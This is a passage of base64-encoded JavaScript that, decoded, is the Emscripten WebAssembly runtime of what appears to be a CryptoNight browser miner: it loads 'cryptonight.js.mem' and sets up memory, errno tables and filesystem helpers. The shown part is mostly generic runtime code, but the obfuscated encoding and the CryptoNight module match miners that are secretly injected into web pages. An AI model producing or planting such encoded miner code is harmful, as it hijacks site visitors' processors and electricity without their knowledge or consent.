bWJseS5NZW1vcnkpKXtNb2R1bGVbInByaW50RXJyIl0oIm5vIG5hdGl2ZSB3YXNtIE1lbW9yeSBpbiB1c2UiKTtyZXR1cm4gZmFsc2V9ZW52WyJtZW1vcnkiXT1Nb2R1bGVbIndhc21NZW1vcnkiXTtpbmZvWyJnbG9iYWwiXT17Ik5hTiI6TmFOLCJJbmZpbml0eSI6SW5maW5pdHl9O2luZm9bImdsb2JhbC5NYXRoIl09Z2xvYmFsLk1hdGg7aW5mb1siZW52Il09ZW52O2Z1bmN0aW9uIHJlY2VpdmVJbnN0YW5jZShpbnN0YW5jZSl7ZXhwb3J0cz1pbnN0YW5jZS5leHBvcnRzO2lmKGV4cG9ydHMubWVtb3J5KW1lcmdlTWVtb3J5KGV4cG9ydHMubWVtb3J5KTtNb2R1bGVbImFzbSJdPWV4cG9ydHM7TW9kdWxlWyJ1c2luZ1dhc20iXT10cnVlO3JlbW92ZVJ1bkRlcGVuZGVuY3koIndhc20taW5zdGFudGlhdGUiKX1hZGRSdW5EZXBlbmRlbmN5KCJ3YXNtLWluc3RhbnRpYXRlIik7aWYoTW9kdWxlWyJpbnN0YW50aWF0ZVdhc20iXSl7dHJ5e3JldHVybiBNb2R1bGVbImluc3RhbnRpYXRlV2FzbSJdKGluZm8scmVjZWl2ZUluc3RhbmNlKX1jYXRjaChlKXtNb2R1bGVbInByaW50RXJyIl0oIk1vZHVsZS5pbnN0YW50aWF0ZVdhc20gY2FsbGJhY2sgZmFpbGVkIHdpdGggZXJyb3I6ICIrZSk7cmV0dXJuIGZhbHNlfX1nZXRCaW5hcnlQcm9taXNlKCkudGhlbigoZnVuY3Rpb24oYmluYXJ5KXtyZXR1cm4gV2ViQXNzZW1ibHkuaW5zdGFudGlhdGUoYmluYXJ5LGluZm8pfSkpLnRoZW4oKGZ1bmN0aW9uKG91dHB1dCl7cmVjZWl2ZUluc3RhbmNlKG91dHB1dFsiaW5zdGFuY2UiXSl9KSkuY2F0Y2goKGZ1bmN0aW9uKHJlYXNvbil7TW9kdWxlWyJwcmludEVyciJdKCJmYWlsZWQgdG8gYXN5bmNocm9ub3VzbHkgcHJlcGFyZSB3YXNtOiAiK3JlYXNvbik7YWJvcnQocmVhc29uKX0pKTtyZXR1cm57fX1Nb2R1bGVbImFzbVByZWxvYWQiXT1Nb2R1bGVbImFzbSJdO3ZhciBhc21qc1JlYWxsb2NCdWZmZXI9TW9kdWxlWyJyZWFsbG9jQnVmZmVyIl07dmFyIHdhc21SZWFsbG9jQnVmZmVyPShmdW5jdGlvbihzaXplKXt2YXIgUEFHRV9NVUxUSVBMRT1Nb2R1bGVbInVzaW5nV2FzbSJdP1dBU01fUEFHRV9TSVpFOkFTTUpTX1BBR0VfU0laRTtzaXplPWFsaWduVXAoc2l6ZSxQQUdFX01VTFRJUExFKTt2YXIgb2xkPU1vZHVsZVsiYnVmZmVyIl07dmFyIG9sZFNpemU9b2xkLmJ5dGVMZW5ndGg7aWYoTW9kdWxlWyJ1c2luZ1dhc20iXSl7dHJ5e3ZhciByZXN1bHQ9TW9kdWxlWyJ3YXNtTWVtb3J5Il0uZ3Jvdygoc2l6ZS1vbGRTaXplKS93YXNtUGFnZVNpemUpO2lmKHJlc3VsdCE9PSgtMXwwKSl7cmV0dXJuIE1vZHVsZVsiYnVmZmVyIl09TW9kdWxlWyJ3YXNtTWVtb3J5Il0uYnVmZmVyfWVsc2V7cmV0dXJuIG51bGx9fWNhdGNoKGUpe3JldHVybiBudWxsfX1lbHNle2V4cG9ydHNbIl9fZ3Jvd1dhc21NZW1vcnkiXSgoc2l6ZS1vbGRTaXplKS93YXNtUGFnZVNpemUpO3JldHVybiBNb2R1bGVbImJ1ZmZlciJdIT09b2xkP01vZHVsZVsiYnVmZmVyIl06bnVsbH19KTtNb2R1bGVbInJlYWxsb2NCdWZmZXIiXT0oZnVuY3Rpb24oc2l6ZSl7aWYoZmluYWxNZXRob2Q9PT0iYXNtanMiKXtyZXR1cm4gYXNtanNSZWFsbG9jQnVmZmVyKHNpemUpfWVsc2V7cmV0dXJuIHdhc21SZWFsbG9jQnVmZmVyKHNpemUpfX0pO3ZhciBmaW5hbE1ldGhvZD0iIjtNb2R1bGVbImFzbSJdPShmdW5jdGlvbihnbG9iYWwsZW52LHByb3ZpZGVkQnVmZmVyKXtnbG9iYWw9Zml4SW1wb3J0cyhnbG9iYWwpO2Vudj1maXhJbXBvcnRzKGVudik7aWYoIWVudlsidGFibGUiXSl7dmFyIFRBQkxFX1NJWkU9TW9kdWxlWyJ3YXNtVGFibGVTaXplIl07aWYoVEFCTEVfU0laRT09PXVuZGVmaW5lZClUQUJMRV9TSVpFPTEwMjQ7dmFyIE1BWF9UQUJMRV9TSVpFPU1vZHVsZVsid2FzbU1heFRhYmxlU2l6ZSJdO2lmKHR5cGVvZiBXZWJBc3NlbWJseT09PSJvYmplY3QiJiZ0eXBlb2YgV2ViQXNzZW1ibHkuVGFibGU9PT0iZnVuY3Rpb24iKXtpZihNQVhfVEFCTEVfU0laRSE9PXVuZGVmaW5lZCl7ZW52WyJ0YWJsZSJdPW5ldyBXZWJBc3NlbWJseS5UYWJsZSh7ImluaXRpYWwiOlRBQkxFX1NJWkUsIm1heGltdW0iOk1BWF9UQUJMRV9TSVpFLCJlbGVtZW50IjoiYW55ZnVuYyJ9KX1lbHNle2VudlsidGFibGUiXT1uZXcgV2ViQXNzZW1ibHkuVGFibGUoeyJpbml0aWFsIjpUQUJMRV9TSVpFLGVsZW1lbnQ6ImFueWZ1bmMifSl9fWVsc2V7ZW52WyJ0YWJsZSJdPW5ldyBBcnJheShUQUJMRV9TSVpFKX1Nb2R1bGVbIndhc21UYWJsZSJdPWVudlsidGFibGUiXX1pZighZW52WyJtZW1vcnlCYXNlIl0pe2VudlsibWVtb3J5QmFzZSJdPU1vZHVsZVsiU1RBVElDX0JBU0UiXX1pZighZW52WyJ0YWJsZUJhc2UiXSl7ZW52WyJ0YWJsZUJhc2UiXT0wfXZhciBleHBvcnRzO2V4cG9ydHM9ZG9OYXRpdmVXYXNtKGdsb2JhbCxlbnYscHJvdmlkZWRCdWZmZXIpO3JldHVybiBleHBvcnRzfSk7dmFyIG1ldGhvZEhhbmRsZXI9TW9kdWxlWyJhc20iXX1pbnRlZ3JhdGVXYXNtSlMoTW9kdWxlKTt2YXIgQVNNX0NPTlNUUz1bXTtTVEFUSUNfQkFTRT1SdW50aW1lLkdMT0JBTF9CQVNFO1NUQVRJQ1RPUD1TVEFUSUNfQkFTRSsxMjUxMjtfX0FUSU5JVF9fLnB1c2goKTttZW1vcnlJbml0aWFsaXplcj1Nb2R1bGVbIndhc21KU01ldGhvZCJdLmluZGV4T2YoImFzbWpzIik+PTB8fE1vZHVsZVsid2FzbUpTTWV0aG9kIl0uaW5kZXhPZigiaW50ZXJwcmV0LWFzbTJ3YXNtIik+PTA/ImNyeXB0b25pZ2h0LmpzLm1lbSI6bnVsbDt2YXIgU1RBVElDX0JVTVA9MTI1MTI7TW9kdWxlWyJTVEFUSUNfQkFTRSJdPVNUQVRJQ19CQVNFO01vZHVsZVsiU1RBVElDX0JVTVAiXT1TVEFUSUNfQlVNUDt2YXIgdGVtcERvdWJsZVB0cj1TVEFUSUNUT1A7U1RBVElDVE9QKz0xNjtmdW5jdGlvbiBfX19hc3NlcnRfZmFpbChjb25kaXRpb24sZmlsZW5hbWUsbGluZSxmdW5jKXtBQk9SVD10cnVlO3Rocm93IkFzc2VydGlvbiBmYWlsZWQ6ICIrUG9pbnRlcl9zdHJpbmdpZnkoY29uZGl0aW9uKSsiLCBhdDogIitbZmlsZW5hbWU/UG9pbnRlcl9zdHJpbmdpZnkoZmlsZW5hbWUpOiJ1bmtub3duIGZpbGVuYW1lIixsaW5lLGZ1bmM/UG9pbnRlcl9zdHJpbmdpZnkoZnVuYyk6InVua25vd24gZnVuY3Rpb24iXSsiIGF0ICIrc3RhY2tUcmFjZSgpfXZhciBQUk9DSU5GTz17cHBpZDoxLHBpZDo0MixzaWQ6NDIscGdpZDo0Mn07dmFyIEVSUk5PX0NPREVTPXtFUEVSTToxLEVOT0VOVDoyLEVTUkNIOjMsRUlOVFI6NCxFSU86NSxFTlhJTzo2LEUyQklHOjcsRU5PRVhFQzo4LEVCQURGOjksRUNISUxEOjEwLEVBR0FJTjoxMSxFV09VTERCTE9DSzoxMSxFTk9NRU06MTIsRUFDQ0VTOjEzLEVGQVVMVDoxNCxFTk9UQkxLOjE1LEVCVVNZOjE2LEVFWElTVDoxNyxFWERFVjoxOCxFTk9ERVY6MTksRU5PVERJUjoyMCxFSVNESVI6MjEsRUlOVkFMOjIyLEVORklMRToyMyxFTUZJTEU6MjQsRU5PVFRZOjI1LEVUWFRCU1k6MjYsRUZCSUc6MjcsRU5PU1BDOjI4LEVTUElQRToyOSxFUk9GUzozMCxFTUxJTks6MzEsRVBJUEU6MzIsRURPTTozMyxFUkFOR0U6MzQsRU5PTVNHOjQyLEVJRFJNOjQzLEVDSFJORzo0NCxFTDJOU1lOQzo0NSxFTDNITFQ6NDYsRUwzUlNUOjQ3LEVMTlJORzo0OCxFVU5BVENIOjQ5LEVOT0NTSTo1MCxFTDJITFQ6NTEsRURFQURMSzozNSxFTk9MQ0s6MzcsRUJBREU6NTIsRUJBRFI6NTMsRVhGVUxMOjU0LEVOT0FOTzo1NSxFQkFEUlFDOjU2LEVCQURTTFQ6NTcsRURFQURMT0NLOjM1LEVCRk9OVDo1OSxFTk9TVFI6NjAsRU5PREFUQTo2MSxFVElNRTo2MixFTk9TUjo2MyxFTk9ORVQ6NjQsRU5PUEtHOjY1LEVSRU1PVEU6NjYsRU5PTElOSzo2NyxFQURWOjY4LEVTUk1OVDo2OSxFQ09NTTo3MCxFUFJPVE86NzEsRU1VTFRJSE9QOjcyLEVET1RET1Q6NzMsRUJBRE1TRzo3NCxFTk9UVU5JUTo3NixFQkFERkQ6NzcsRVJFTUNIRzo3OCxFTElCQUNDOjc5LEVMSUJCQUQ6ODAsRUxJQlNDTjo4MSxFTElCTUFYOjgyLEVMSUJFWEVDOjgzLEVOT1NZUzozOCxFTk9URU1QVFk6MzksRU5BTUVUT09MT05HOjM2LEVMT09QOjQwLEVPUE5PVFNVUFA6OTUsRVBGTk9TVVBQT1JUOjk2LEVDT05OUkVTRVQ6MTA0LEVOT0JVRlM6MTA1LEVBRk5PU1VQUE9SVDo5NyxFUFJPVE9UWVBFOjkxLEVOT1RTT0NLOjg4LEVOT1BST1RPT1BUOjkyLEVTSFVURE9XTjoxMDgsRUNPTk5SRUZVU0VEOjExMSxFQUREUklOVVNFOjk4LEVDT05OQUJPUlRFRDoxMDMsRU5FVFVOUkVBQ0g6MTAxLEVORVRET1dOOjEwMCxFVElNRURPVVQ6MTEwLEVIT1NURE9XTjoxMTIsRUhPU1RVTlJFQUNIOjExMyxFSU5QUk9HUkVTUzoxMTUsRUFMUkVBRFk6MTE0LEVERVNUQUREUlJFUTo4OSxFTVNHU0laRTo5MCxFUFJPVE9OT1NVUFBPUlQ6OTMsRVNPQ0tUTk9TVVBQT1JUOjk0LEVBRERSTk9UQVZBSUw6OTksRU5FVFJFU0VUOjEwMixFSVNDT05OOjEwNixFTk9UQ09OTjoxMDcsRVRPT01BTllSRUZTOjEwOSxFVVNFUlM6ODcsRURRVU9UOjEyMixFU1RBTEU6MTE2LEVOT1RTVVA6OTUsRU5PTUVESVVNOjEyMyxFSUxTRVE6ODQsRU9WRVJGTE9XOjc1LEVDQU5DRUxFRDoxMjUsRU5PVFJFQ09WRVJBQkxFOjEzMSxFT1dORVJERUFEOjEzMCxFU1RSUElQRTo4Nn07dmFyIEVSUk5PX01FU1NBR0VTPXswOiJTdWNjZXNzIiwxOiJOb3Qgc3VwZXItdXNlciIsMjoiTm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeSIsMzoiTm8gc3VjaCBwcm9jZXNzIiw0OiJJbnRlcnJ1cHRlZCBzeXN0ZW0gY2FsbCIsNToiSS9PIGVycm9yIiw2OiJObyBzdWNoIGRldmljZSBvciBhZGRyZXNzIiw3OiJBcmcgbGlzdCB0b28gbG9uZyIsODoiRXhlYyBmb3JtYXQgZXJyb3IiLDk6IkJhZCBmaWxlIG51bWJlciIsMTA6Ik5vIGNoaWxkcmVuIiwxMToiTm8gbW9yZSBwcm9jZXNzZXMiLDEyOiJOb3QgZW5vdWdoIGNvcmUiLDEzOiJQZXJtaXNzaW9uIGRlbmllZCIsMTQ6IkJhZCBhZGRyZXNzIiwxNToiQmxvY2sgZGV2aWNlIHJlcXVpcmVkIiwxNjoiTW91bnQgZGV2aWNlIGJ1c3kiLDE3OiJGaWxlIGV4aXN0cyIsMTg6IkNyb3NzLWRldmljZSBsaW5rIiwxOToiTm8gc3VjaCBkZXZpY2UiLDIwOiJOb3QgYSBkaXJlY3RvcnkiLDIxOiJJcyBhIGRpcmVjdG9yeSIsMjI6IkludmFsaWQgYXJndW1lbnQiLDIzOiJUb28gbWFueSBvcGVuIGZpbGVzIGluIHN5c3RlbSIsMjQ6IlRvbyBtYW55IG9wZW4gZmlsZXMiLDI1OiJOb3QgYSB0eXBld3JpdGVyIiwyNjoiVGV4dCBmaWxlIGJ1c3kiLDI3OiJGaWxlIHRvbyBsYXJnZSIsMjg6Ik5vIHNwYWNlIGxlZnQgb24gZGV2aWNlIiwyOToiSWxsZWdhbCBzZWVrIiwzMDoiUmVhZCBvbmx5IGZpbGUgc3lzdGVtIiwzMToiVG9vIG1hbnkgbGlua3MiLDMyOiJCcm9rZW4gcGlwZSIsMzM6Ik1hdGggYXJnIG91dCBvZiBkb21haW4gb2YgZnVuYyIsMzQ6Ik1hdGggcmVzdWx0IG5vdCByZXByZXNlbnRhYmxlIiwzNToiRmlsZSBsb2NraW5nIGRlYWRsb2NrIGVycm9yIiwzNjoiRmlsZSBvciBwYXRoIG5hbWUgdG9vIGxvbmciLDM3OiJObyByZWNvcmQgbG9ja3MgYXZhaWxhYmxlIiwzODoiRnVuY3Rpb24gbm90IGltcGxlbWVudGVkIiwzOToiRGlyZWN0b3J5IG5vdCBlbXB0eSIsNDA6IlRvbyBtYW55IHN5bWJvbGljIGxpbmtzIiw0MjoiTm8gbWVzc2FnZSBvZiBkZXNpcmVkIHR5cGUiLDQzOiJJZGVudGlmaWVyIHJlbW92ZWQiLDQ0OiJDaGFubmVsIG51bWJlciBvdXQgb2YgcmFuZ2UiLDQ1OiJMZXZlbCAyIG5vdCBzeW5jaHJvbml6ZWQiLDQ2OiJMZXZlbCAzIGhhbHRlZCIsNDc6IkxldmVsIDMgcmVzZXQiLDQ4OiJMaW5rIG51bWJlciBvdXQgb2YgcmFuZ2UiLDQ5OiJQcm90b2NvbCBkcml2ZXIgbm90IGF0dGFjaGVkIiw1MDoiTm8gQ1NJIHN0cnVjdHVyZSBhdmFpbGFibGUiLDUxOiJMZXZlbCAyIGhhbHRlZCIsNTI6IkludmFsaWQgZXhjaGFuZ2UiLDUzOiJJbnZhbGlkIHJlcXVlc3QgZGVzY3JpcHRvciIsNTQ6IkV4Y2hhbmdlIGZ1bGwiLDU1OiJObyBhbm9kZSIsNTY6IkludmFsaWQgcmVxdWVzdCBjb2RlIiw1NzoiSW52YWxpZCBzbG90Iiw1OToiQmFkIGZvbnQgZmlsZSBmbXQiLDYwOiJEZXZpY2Ugbm90IGEgc3RyZWFtIiw2MToiTm8gZGF0YSAoZm9yIG5vIGRlbGF5IGlvKSIsNjI6IlRpbWVyIGV4cGlyZWQiLDYzOiJPdXQgb2Ygc3RyZWFtcyByZXNvdXJjZXMiLDY0OiJNYWNoaW5lIGlzIG5vdCBvbiB0aGUgbmV0d29yayIsNjU6IlBhY2thZ2Ugbm90IGluc3RhbGxlZCIsNjY6IlRoZSBvYmplY3QgaXMgcmVtb3RlIiw2NzoiVGhlIGxpbmsgaGFzIGJlZW4gc2V2ZXJlZCIsNjg6IkFkdmVydGlzZSBlcnJvciIsNjk6IlNybW91bnQgZXJyb3IiLDcwOiJDb21tdW5pY2F0aW9uIGVycm9yIG9uIHNlbmQiLDcxOiJQcm90b2NvbCBlcnJvciIsNzI6Ik11bHRpaG9wIGF0dGVtcHRlZCIsNzM6IkNyb3NzIG1vdW50IHBvaW50IChub3QgcmVhbGx5IGVycm9yKSIsNzQ6IlRyeWluZyB0byByZWFkIHVucmVhZGFibGUgbWVzc2FnZSIsNzU6IlZhbHVlIHRvbyBsYXJnZSBmb3IgZGVmaW5lZCBkYXRhIHR5cGUiLDc2OiJHaXZlbiBsb2cuIG5hbWUgbm90IHVuaXF1ZSIsNzc6ImYuZC4gaW52YWxpZCBmb3IgdGhpcyBvcGVyYXRpb24iLDc4OiJSZW1vdGUgYWRkcmVzcyBjaGFuZ2VkIiw3OToiQ2FuIGFjY2VzcyBhIG5lZWRlZCBzaGFyZWQgbGliIiw4MDoiQWNjZXNzaW5nIGEgY29ycnVwdGVkIHNoYXJlZCBsaWIiLDgxOiIubGliIHNlY3Rpb24gaW4gYS5vdXQgY29ycnVwdGVkIiw4MjoiQXR0ZW1wdGluZyB0byBsaW5rIGluIHRvbyBtYW55IGxpYnMiLDgzOiJBdHRlbXB0aW5nIHRvIGV4ZWMgYSBzaGFyZWQgbGlicmFyeSIsODQ6IklsbGVnYWwgYnl0ZSBzZXF1ZW5jZSIsODY6IlN0cmVhbXMgcGlwZSBlcnJvciIsODc6IlRvbyBtYW55IHVzZXJzIiw4ODoiU29ja2V0IG9wZXJhdGlvbiBvbiBub24tc29ja2V0Iiw4OToiRGVzdGluYXRpb24gYWRkcmVzcyByZXF1aXJlZCIsOTA6Ik1lc3NhZ2UgdG9vIGxvbmciLDkxOiJQcm90b2NvbCB3cm9uZyB0eXBlIGZvciBzb2NrZXQiLDkyOiJQcm90b2NvbCBub3QgYXZhaWxhYmxlIiw5MzoiVW5rbm93biBwcm90b2NvbCIsOTQ6IlNvY2tldCB0eXBlIG5vdCBzdXBwb3J0ZWQiLDk1OiJOb3Qgc3VwcG9ydGVkIiw5NjoiUHJvdG9jb2wgZmFtaWx5IG5vdCBzdXBwb3J0ZWQiLDk3OiJBZGRyZXNzIGZhbWlseSBub3Qgc3VwcG9ydGVkIGJ5IHByb3RvY29sIGZhbWlseSIsOTg6IkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiLDk5OiJBZGRyZXNzIG5vdCBhdmFpbGFibGUiLDEwMDoiTmV0d29yayBpbnRlcmZhY2UgaXMgbm90IGNvbmZpZ3VyZWQiLDEwMToiTmV0d29yayBpcyB1bnJlYWNoYWJsZSIsMTAyOiJDb25uZWN0aW9uIHJlc2V0IGJ5IG5ldHdvcmsiLDEwMzoiQ29ubmVjdGlvbiBhYm9ydGVkIiwxMDQ6IkNvbm5lY3Rpb24gcmVzZXQgYnkgcGVlciIsMTA1OiJObyBidWZmZXIgc3BhY2UgYXZhaWxhYmxlIiwxMDY6IlNvY2tldCBpcyBhbHJlYWR5IGNvbm5lY3RlZCIsMTA3OiJTb2NrZXQgaXMgbm90IGNvbm5lY3RlZCIsMTA4OiJDYW5cJ3Qgc2VuZCBhZnRlciBzb2NrZXQgc2h1dGRvd24iLDEwOToiVG9vIG1hbnkgcmVmZXJlbmNlcyIsMTEwOiJDb25uZWN0aW9uIHRpbWVkIG91dCIsMTExOiJDb25uZWN0aW9uIHJlZnVzZWQiLDExMjoiSG9zdCBpcyBkb3duIiwxMTM6Ikhvc3QgaXMgdW5yZWFjaGFibGUiLDExNDoiU29ja2V0IGFscmVhZHkgY29ubmVjdGVkIiwxMTU6IkNvbm5lY3Rpb24gYWxyZWFkeSBpbiBwcm9ncmVzcyIsMTE2OiJTdGFsZSBmaWxlIGhhbmRsZSIsMTIyOiJRdW90YSBleGNlZWRlZCIsMTIzOiJObyBtZWRpdW0gKGluIHRhcGUgZHJpdmUpIiwxMjU6Ik9wZXJhdGlvbiBjYW5jZWxlZCIsMTMwOiJQcmV2aW91cyBvd25lciBkaWVkIiwxMzE6IlN0YXRlIG5vdCByZWNvdmVyYWJsZSJ9O2Z1bmN0aW9uIF9fX3NldEVyck5vKHZhbHVlKXtpZihNb2R1bGVbIl9fX2Vycm5vX2xvY2F0aW9uIl0pSEVBUDMyW01vZHVsZVsiX19fZXJybm9fbG9jYXRpb24iXSgpPj4yXT12YWx1ZTtyZXR1cm4gdmFsdWV9dmFyIFBBVEg9e3NwbGl0UGF0aDooZnVuY3Rpb24oZmlsZW5hbWUpe3ZhciBzcGxpdFBhdGhSZT0vXihcXC8/fCkoW1xcc1xcU10qPykoKD86XFwuezEsMn18W15cXC9dKz98KShcXC5bXi5cXC9dKnwpKSg/OltcXC9dKikkLztyZXR1cm4gc3BsaXRQYXRoUmUuZXhlYyhmaWxlbmFtZSkuc2xpY2UoMSl9KSxub3JtYWxpemVBcnJheTooZnVuY3Rpb24ocGFydHMsYWxsb3dBYm92ZVJvb3Qpe3ZhciB1cD0wO2Zvcih2YXIgaT1wYXJ0cy5sZW5ndGgtMTtpPj0wO2ktLSl7dmFyIGxhc3Q9cGFydHNbaV07aWYobGFzdD09PSIuIil7cGFydHMuc3BsaWNlKGksMSl9ZWxzZSBpZihsYXN0PT09Ii4uIil7cGFydHMuc3BsaWNlKGksMSk7dXArK31lbHNlIGlmKHVwKXtwYXJ0cy5zcGxpY2UoaSwxKTt1cC0tfX1pZihhbGxvd0Fib3ZlUm9vdCl7Zm9yKDt1cDt1cC0tKXtwYXJ0cy51bnNoaWZ0KCIuLiIpfX1yZXR1cm4gcGFydHN9KSxub3JtYWxpemU6KGZ1bmN0aW9uKHBhdGgpe3ZhciBpc0Fic29sdXRlPXBhdGguY2hhckF0KDApPT09Ii8iLHRyYWlsaW5nU2xhc2g9cGF0aC5zdWJzdHIoLTEpPT09Ii8iO3BhdGg9UEFUSC5ub3JtYWxpemVBcnJheShwYXRoLnNwbGl0KCIvIikuZmlsdGVyKChmdW5jdGlvbihwKXtyZXR1cm4hIXB9KSksIWlzQWJzb2x1dGUpLmpvaW4oIi8iKTtpZighcGF0aCYmIWlzQWJzb2x1dGUpe3BhdGg9Ii4ifWlmKHBhdGgmJnRyYWlsaW5nU2xhc2gpe3BhdGgrPSIvIn1yZXR1cm4oaXNBYnNvbHV0ZT8iLyI6IiIpK3BhdGh9KSxkaXJuYW1lOihmdW5jdGlvbihwYXRoKXt2YXIgcmVzdWx0PVBBVEguc3BsaXRQYXRoKHBhdGgpLHJvb3Q9cmVzdWx0WzBdLGRpcj1yZXN1bHRbMV07aWYoIXJvb3QmJiFkaXIpe3JldHVybiIuIn1pZihkaXIpe2Rpcj1kaXIuc3Vic3RyKDAsZGlyLmxlbmd0aC0xKX1yZXR1cm4gcm9vdCtkaXJ9KSxiYXNlbmFtZTooZnVuY3Rpb24ocGF0aCl7aWYocGF0aD09PSIvIilyZXR1cm4iLyI7dmFyIGxhc3RTbGFzaD1wYXRoLmxhc3RJbmRleE9mKCIvIik7aWYobGFzdFNsYXNoPT09LTEpcmV0dXJuIHBhdGg7cmV0dXJuIHBhdGguc3Vic3RyKGxhc3RTbGFzaCsxKX0pLGV4dG5hbWU6KGZ1bmN0aW9uKHBhdGgpe3JldHVybiBQQVRILnNwbGl0UGF0aChwYXRoKVszXX0pLGpvaW46KGZ1bmN0aW9uKCl7dmFyIHBhdGhzPUFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cywwKTtyZXR1cm4gUEFUSC5ub3JtYWxpemUocGF0aHMuam9pbigiLyIpKX0pLGpvaW4yOihmdW5jdGlvbihsLHIpe3JldHVybiBQQVRILm5vcm1hbGl6ZShsKyIvIityKX0pLHJlc29sdmU6KGZ1bmN0aW9uKCl7dmFyIHJlc29sdmVkUGF0aD0iIixyZXNvbHZlZEFic29sdXRlPWZhbHNlO2Zvcih2YXIgaT1hcmd1bWVudHMubGVuZ3RoLTE7aT49LTEmJiFyZXNvbHZlZEFic29sdXRlO2ktLSl7dmFyIHBhdGg9aT49MD9hcmd1bWVudHNbaV06RlMuY3dkKCk7aWYodHlwZW9mIHBhdGghPT0ic3RyaW5nIil7dGhyb3cgbmV3IFR5cGVFcnJvcigiQXJndW1lbnRzIHRvIHBhdGgucmVzb2x2ZSBtdXN0IGJlIHN0cmluZ3MiKX1lbHNlIGlmKCFwYXRoKXtyZXR1cm4iIn1yZXNvbHZlZFBhdGg9cGF0aCsiLyIrcmVzb2x2ZWRQYXRoO3Jlc29sdmVkQWJzb2x1dGU9cGF0aC5jaGFyQXQoMCk9PT0iLyJ9cmVzb2x2ZWRQYXRoPVBBVEgubm9ybWFsaXplQXJyYXkocmVzb2x2ZWRQYXRoLnNwbGl0KCIvIikuZmlsdGVyKChmdW5jdGlvbihwKXtyZXR1cm4hIXB9KSksIXJlc29sdmVkQWJzb2x1dGUpLmpvaW4oIi8iKTtyZXR1cm4ocmVzb2x2ZWRBYnNvbHV0ZT8iLyI6IiIpK3Jlc29sdmVkUGF0aHx8Ii4ifSkscmVsYXRpdmU6KGZ1bmN0aW9uKGZyb20sdG8pe2Zyb209UEFUSC5yZXNvbHZlKGZyb20pLnN1YnN0cigxKTt0bz1QQVRILnJlc29sdmUodG8pLnN1YnN0cigxKTtmdW5jdGlvbiB0cmltKGFycil7dmFyIHN0YXJ0PTA7Zm9yKDtzdGFydDxhcnIubGVuZ3RoO3N0YXJ0Kyspe2lmKGFycltzdGFydF0hPT0iIilicmVha312YXIgZW5kPWFyci5sZW5ndGgtMTtmb3IoO2VuZD49MDtlbmQtLSl7aWYoYXJyW2VuZF0hPT0iIilicmVha31pZihzdGFydD5lbmQpcmV0dXJuW107cmV0dXJuIGFyci5zbGljZShzdGFydCxlbmQtc3RhcnQrMSl9dmFyIGZyb21QYXJ0cz10cmltKGZyb20uc3BsaXQoIi8iKSk7dmFyIHRvUGFydHM9dHJpbSh0by5zcGxpdCgiLyIpKTt2YXIgbGVuZ3RoPU1hdGgubWluKGZyb21QYXJ0cy5sZW5ndGgsdG9QYXJ0cy5sZW5ndGgpO3ZhciBzYW1lUGFydHNMZW5ndGg9bGVuZ3RoO2Zvcih2YXIgaT0wO2k8bGVuZ3RoO2krKyl7aWYoZnJvbVBhcnRzW2ldIT09dG9QYXJ0c1tpXSl7c2FtZVBhcnRzTGVuZ3RoPWk7YnJlYWt9fXZhciBvdXRwdXRQYXJ0cz1bXTtmb3IodmFyIGk9c2FtZVBhcnRzTGVuZ3RoO2k8ZnJvbVBhcnRzLmxlbmd0aDtpKyspe291dHB1dFBhcnRzLnB1c2goIi4uIil9b3V0cHV0UGFydHM9b3V0cHV0UGFydHMuY29uY2F0KHRvUGFydHMuc2xpY2Uoc2FtZVBhcnRzTGVuZ3RoKSk7cmV0dXJuIG91dHB1dFBhcnRzLmpvaW4oIi8iKX0pfTt2YXIgVFRZPXt0dHlzOltdLGluaXQ6KGZ1bmN0aW9uKCl7fSksc2h1dGRvd246KGZ1bmN0aW9uKCl7fSkscmVnaXN0ZXI6KGZ1bmN0aW9uKGRldixvcHMpe1RUWS50dHlzW2Rldl09e2lucHV0OltdLG91dHB1dDpbXSxvcHM6b3BzfTtGUy5yZWdpc3RlckRldmljZShkZXYsVFRZLnN0cmVhbV9vcHMpfSksc3RyZWFtX29wczp7b3BlbjooZnVuY3Rpb24oc3RyZWFtKXt2YXIgdHR5PVRUWS50dHlzW3N0cmVhbS5ub2RlLnJkZXZdO2lmKCF0dHkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0RFVil9c3RyZWFtLnR0eT10dHk7c3RyZWFtLnNlZWthYmxlPWZhbHNlfSksY2xvc2U6KGZ1bmN0aW9uKHN0cmVhbSl7c3RyZWFtLnR0eS5vcHMuZmx1c2goc3RyZWFtLnR0eSl9KSxmbHVzaDooZnVuY3Rpb24oc3RyZWFtKXtzdHJlYW0udHR5Lm9wcy5mbHVzaChzdHJlYW0udHR5KX0pLHJlYWQ6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3Mpe2lmKCFzdHJlYW0udHR5fHwhc3RyZWFtLnR0eS5vcHMuZ2V0X2NoYXIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOWElPKX12YXIgYnl0ZXNSZWFkPTA7Zm9yKHZhciBpPTA7aTxsZW5ndGg7aSsrKXt2YXIgcmVzdWx0O3RyeXtyZXN1bHQ9c3RyZWFtLnR0eS5vcHMuZ2V0X2NoYXIoc3RyZWFtLnR0eSl9Y2F0Y2goZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlPKX1pZihyZXN1bHQ9PT11bmRlZmluZWQmJmJ5dGVzUmVhZD09PTApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVBR0FJTil9aWYocmVzdWx0PT09bnVsbHx8cmVzdWx0PT09dW5kZWZpbmVkKWJyZWFrO2J5dGVzUmVhZCsrO2J1ZmZlcltvZmZzZXQraV09cmVzdWx0fWlmKGJ5dGVzUmVhZCl7c3RyZWFtLm5vZGUudGltZXN0YW1wPURhdGUubm93KCl9cmV0dXJuIGJ5dGVzUmVhZH0pLHdyaXRlOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zKXtpZighc3RyZWFtLnR0eXx8IXN0cmVhbS50dHkub3BzLnB1dF9jaGFyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTlhJTyl9Zm9yKHZhciBpPTA7aTxsZW5ndGg7aSsrKXt0cnl7c3RyZWFtLnR0eS5vcHMucHV0X2NoYXIoc3RyZWFtLnR0eSx